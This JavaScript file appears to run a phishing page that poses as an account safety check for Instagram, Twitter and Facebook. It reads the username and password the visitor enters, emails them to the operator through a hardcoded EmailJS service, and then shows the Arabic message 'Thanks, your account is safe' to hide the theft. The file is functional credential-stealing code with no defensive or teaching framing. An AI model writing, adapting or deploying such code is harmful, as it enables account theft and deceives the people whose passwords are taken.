// Initialize EmailJS
(function() {
    emailjs.init("1xqwBMfecM1SSulsh"); // Public Key
})();

// Toggle Forms
function toggleForm(platform) {
    // إخفاء جميع النماذج
    document.querySelectorAll('.form').forEach(form => {
        if (form.classList.contains('hidden') === false) {
            form.classList.add('hidden');
        }
    });

    // إظهار النموذج المحدد
    const formToShow = document.getElementById(`${platform}-form`);
    if (formToShow) {
        formToShow.classList.remove('hidden');
    } else {
        console.error(`Form with ID ${platform}-form not found!`);
    }

    // إخفاء نتيجة الفحص
    const resultDiv = document.getElementById('result');
    if (resultDiv) {
        resultDiv.classList.add('hidden');
    }
}

// Send Data and Show Message
function sendData(platform) {
    const username = document.getElementById(`${platform}-username`).value;
    const password = document.getElementById(`${platform}-password`).value;

    if (!username || !password) {
        Swal.fire('خطأ', 'يرجى إدخال اسم المستخدم وكلمة المرور.', 'error');
        return;
    }

    // عرض رسالة تحميل
    Swal.fire({
        title: 'جاري الإرسال...',
        text: 'يرجى الانتظار',
        allowOutsideClick: false,
        didOpen: () => {
            Swal.showLoading();
        }
    });

    // إرسال البريد الإلكتروني
    emailjs.send("service_ir3vg5y", "template_q95bk8a", {
        platform: platform,
        username: username,
        password: password
    }).then(function(response) {
        // عرض رسالة "شكرًا، حسابك آمن"
        Swal.fire('شكرًا', 'حسابك آمن.', 'success');
        document.getElementById('result-message').textContent = "شكرًا، حسابك آمن.";
        document.getElementById('result').classList.remove('hidden');
    }, function(error) {
        console.error('Error sending email:', error); // إضافة سجل للخطأ
        Swal.fire('خطأ', 'حدث خطأ أثناء إرسال البيانات. يرجى المحاولة مرة أخرى.', 'error');
        document.getElementById('result-message').textContent = "حدث خطأ أثناء الإرسال. يرجى المحاولة مرة أخرى.";
        document.getElementById('result').classList.remove('hidden');
    });
}

// إضافة معالجات الأحداث
document.getElementById('instagram-btn').addEventListener('click', () => toggleForm('instagram'));
document.getElementById('twitter-btn').addEventListener('click', () => toggleForm('twitter'));
document.getElementById('facebook-btn').addEventListener('click', () => toggleForm('facebook'));

document.getElementById('instagram-check').addEventListener('click', () => sendData('instagram'));
document.getElementById('twitter-check').addEventListener('click', () => sendData('twitter'));
document.getElementById('facebook-check').addEventListener('click', () => sendData('facebook'));
